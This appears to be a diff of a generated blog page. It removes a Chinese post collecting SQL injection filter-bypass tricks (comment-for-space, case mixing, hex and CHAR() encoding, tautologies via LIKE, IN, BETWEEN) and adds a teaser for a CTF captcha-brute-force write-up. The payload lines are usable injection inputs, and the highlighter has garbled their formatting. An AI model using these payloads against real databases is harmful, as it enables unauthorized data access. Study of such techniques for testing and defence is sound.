@@ -3,26 +3,17 @@
 <head>
   <meta charset="utf-8">
   
-  <title>关于sql注入的一些方法。 | Edward_L&#39;s Blog</title>
+  <title>Edward_L&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="关于sql注入的一些方法。
-现在的sql注入越来越少了，搜索框的注入还算多，前几天的alictf的比赛有点让我脑洞大开的感觉（也可能是我见识太短浅），所以特意在网上找了一些和sql注入有关的一些方法，摘录下来和大家做一些分享。也希望大家谁有奇特思路或者好的方法能够与我共享。
-摘自：
-http://www.programlife.net/pass-sql-injection-filter.html">
-<meta property="og:type" content="article">
-<meta property="og:title" content="关于sql注入的一些方法。">
-<meta property="og:url" content="http://edward-l.github.io/2014/07/26/关于sql注入的一些方法/index.html">
+  <meta name="description">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Edward_L's Blog">
+<meta property="og:url" content="http://edward-l.github.io/tags/punch/index.html">
 <meta property="og:site_name" content="Edward_L's Blog">
-<meta property="og:description" content="关于sql注入的一些方法。
-现在的sql注入越来越少了，搜索框的注入还算多，前几天的alictf的比赛有点让我脑洞大开的感觉（也可能是我见识太短浅），所以特意在网上找了一些和sql注入有关的一些方法，摘录下来和大家做一些分享。也希望大家谁有奇特思路或者好的方法能够与我共享。
-摘自：
-http://www.programlife.net/pass-sql-injection-filter.html">
+<meta property="og:description">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="关于sql注入的一些方法。">
-<meta name="twitter:description" content="关于sql注入的一些方法。
-现在的sql注入越来越少了，搜索框的注入还算多，前几天的alictf的比赛有点让我脑洞大开的感觉（也可能是我见识太短浅），所以特意在网上找了一些和sql注入有关的一些方法，摘录下来和大家做一些分享。也希望大家谁有奇特思路或者好的方法能够与我共享。
-摘自：
-http://www.programlife.net/pass-sql-injection-filter.html">
+<meta name="twitter:title" content="Edward_L's Blog">
+<meta name="twitter:description">
   
   
     <link rel="icon" href="/favicon.png">
@@ -89,14 +80,16 @@ ga('send', 'pageview');
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-关于sql注入的一些方法" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main">
+  
+    <article id="post-hduisa_ctf_week5_writeup" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2014/07/26/关于sql注入的一些方法/" class="article-date">
-  <time datetime="2014-07-26T07:30:16.000Z" itemprop="datePublished">Jul 26 2014</time>
+    <a href="/2015/03/16/hduisa_ctf_week5_writeup/" class="article-date">
+  <time datetime="2015-03-16T02:30:16.000Z" itemprop="datePublished">Mar 16 2015</time>
 </a>
     
   <div class="article-category">
-    <a class="article-category-link" href="/categories/sql-injection/">sql_injection</a>
+    <a class="article-category-link" href="/categories/writeup/">writeup</a>
   </div>
 
   </div>
@@ -106,8 +99,8 @@ ga('send', 'pageview');
       <header class="article-header">
         
   
-    <h1 class="article-title" itemprop="name">
-      关于sql注入的一些方法。
+    <h1 itemprop="name">
+      <a class="article-title" href="/2015/03/16/hduisa_ctf_week5_writeup/">hduisa_ctf_week5_writeup</a>
     </h1>
   
 
@@ -115,70 +108,33 @@ ga('send', 'pageview');
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>关于sql注入的一些方法。</p>
-<p>现在的sql注入越来越少了，搜索框的注入还算多，前几天的alictf的比赛有点让我脑洞大开的感觉（也可能是我见识太短浅），所以特意在网上找了一些和sql注入有关的一些方法，摘录下来和大家做一些分享。也希望大家谁有奇特思路或者好的方法能够与我共享。</p>
-<p>摘自：</p>
-<p><a href="http://www.programlife.net/pass-sql-injection-filter.html" target="_blank" rel="external">http://www.programlife.net/pass-sql-injection-filter.html</a></p>
-<p><a href="http://fulong258.blog.163.com/blog/static/17895044200851033720834/" target="_blank" rel="external">http://fulong258.blog.163.com/blog/static/17895044200851033720834/</a></p>
-<ol>
-<li>绕过空格过滤</li>
-</ol>
-<p>使用注释<code>/**/</code>来替换，类似C语言一样，C语言在编译之前注释会被用个空格替换。</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator"><span class="keyword">select</span><span class="comment">/**/</span>pwd<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>usertable<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>id=<span class="string">'admin'</span></span><br><span class="line"><span class="string">``</span><span class="string">` </span><br><span class="line">&lt;!-- more --&gt;</span><br><span class="line"></span><br><span class="line">2.绕过关键字过滤</span><br><span class="line">很多人都对`</span><span class="keyword">select</span><span class="string">`, `</span><span class="keyword">union</span><span class="string">`操作关键字等进行了过滤,但是有可能没有考虑大小写的问题。</span></span></span><br></pre></td></tr></table></figure>
-<p>SeLeCT pwd from usertable where id=’admin’<br><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">3.</span>用编码绕过关键字过滤</span><br><span class="line">可以把字符转换为<span class="preprocessor">%</span>加上<span class="number">16</span>进制的形式，如</span><br><span class="line">`<span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span>`即`<span class="preprocessor">%</span><span class="number">6</span>f<span class="preprocessor">%</span><span class="number">72</span><span class="preprocessor">%</span><span class="number">20</span><span class="preprocessor">%</span><span class="number">31</span><span class="preprocessor">%</span><span class="number">3</span>d<span class="preprocessor">%</span><span class="number">31</span>`</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span>使用`char`来绕过过滤</span><br><span class="line">使用`char<span class="comment">(ASCII码)</span>`来替换字符，可以直接在`MySql`下工作。</span><br></pre></td></tr></table></figure></p>
-<p>CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">为<span class="escape">`o</span>r <span class="number">1</span>=<span class="number">1</span><span class="escape">`的</span>编码。</span><br></pre></td></tr></table></figure></p>
-<p>select pwd from usertable where id=’root’+CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">5</span>.绕过其他一些过滤机制</span><br><span class="line">有些朋友会把提交的数据中的敏感字直接删除，这个还是可以绕过的。例如，试图从提交数据中删除<span class="escape">`a</span>nd<span class="escape">`，</span>可以尝试提交<span class="escape">`a</span>nandd<span class="escape">`或</span>者<span class="escape">`a</span>andnd<span class="escape">`</span><br><span class="line"></span></span><br><span class="line"><span class="number">6</span>.对于</span><br><span class="line"><span class="escape">`o</span>r <span class="number">1</span>=<span class="number">1</span><span class="escape">`这</span>样的语句还可以用字符串替换</span><br></pre></td></tr></table></figure></p>
-<p>select pwd from usertable where id=’root’or’haha’=’haha’<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">或者</span><br></pre></td></tr></table></figure></p>
-<p>select pwd from usertable where id=’root’or’haha’=’ha’+’ha’<br><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">7</span>、通过<span class="escape">`L</span>IKE<span class="escape">`绕</span>过 ，如</span><br></pre></td></tr></table></figure></p>
-<p>or ‘swords’ LIKE ‘sw’<br> <figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">显然可以很轻松的绕过<span class="escape">`=</span><span class="escape">` </span><span class="escape">`&gt;</span><span class="escape">`的</span>限制……</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">8</span>、通过<span class="escape">`I</span>N<span class="escape">`绕</span>过与上面的<span class="escape">`L</span>IKE<span class="escape">`的</span>思路差不多,如</span><br></pre></td></tr></table></figure></p>
-<p>or ’swords’ IN (’swords’)<br><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="autohotkey"><span class="number">9</span>、通过<span class="escape">`B</span>ETWEEN<span class="escape">`绕</span>过如<span class="escape">`o</span>r ’swords’ BETWEEN ’rw’ <span class="literal">AND</span> ’tw’<span class="escape">`</span><br><span class="line"></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">10</span>、通过<span class="escape">`&gt;</span><span class="escape">`或</span>者<span class="escape">`&lt;</span><span class="escape">`绕</span>过</span></span><br></pre></td></tr></table></figure></p>
-<p>or ’swords’ &gt; ’sw’  </p>
-<p>or ’swords’ &lt; ’tw’</p>
-<p>or 1&lt;3<br>```<br>……</p>
-
+        <h3 id="Problem_ID:17">Problem ID:17</h3><h3 id="EasyUser">EasyUser</h3><p>一看就是一个爆破验证码的题目，然后就开始写脚本<br>
+        
+          <p class="article-more-link">
+            <a href="/2015/03/16/hduisa_ctf_week5_writeup/#more">Read More</a>
+          </p>
+        
       
     </div>
     <footer class="article-footer">
       
-        <a data-url="http://edward-l.github.io/2014/07/26/关于sql注入的一些方法/" data-id="ci7nhb8h8000zz8tshg3m4f75" class="article-share-link" data-share="baidu">分享到</a>
+        <a data-url="http://edward-l.github.io/2015/03/16/hduisa_ctf_week5_writeup/" data-id="ci7nhb8ir003gz8tsnet0sgfo" class="article-share-link" data-share="baidu">分享到</a>
       
 
       
-        <a href="http://edward-l.github.io/2014/07/26/关于sql注入的一些方法/#ds-thread" class="article-comment-link">Comments</a>
+        <a href="http://edward-l.github.io/2015/03/16/hduisa_ctf_week5_writeup/#ds-thread" class="article-comment-link">Comments</a>
       
 
       
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql-injection/">sql_injection</a></li></ul>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/crc/">crc</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/hduisa-ctf/">hduisa_ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/punch/">punch</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/threading/">threading</a></li></ul>
 
     </footer>
   </div>
   
-    
-<nav id="article-nav">
-  
-    <a href="/2014/08/25/alictf中很神奇的一个sql注入点/" id="article-nav-newer" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Newer</strong>
-      <div class="article-nav-title">
-        
-          alictf中一个很神奇的sql注入
-        
-      </div>
-    </a>
-  
-  
-    <a href="/2014/06/26/The Harvester 挖掘利用邮箱地址/" id="article-nav-older" class="article-nav-link-wrap">
-      <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">The Harvester 挖掘利用邮箱地址</div>
-    </a>
-  
-</nav>
-
-  
 </article>
 
-  <section id="comments">
-    <div id="ds-thread" class="ds-thread" data-thread-key="2014/07/26/关于sql注入的一些方法/" data-title="关于sql注入的一些方法。" data-url="http://edward-l.github.io/2014/07/26/关于sql注入的一些方法/"></div>
-  </section>
+  
+  
 </section>
         
           <aside id="sidebar">
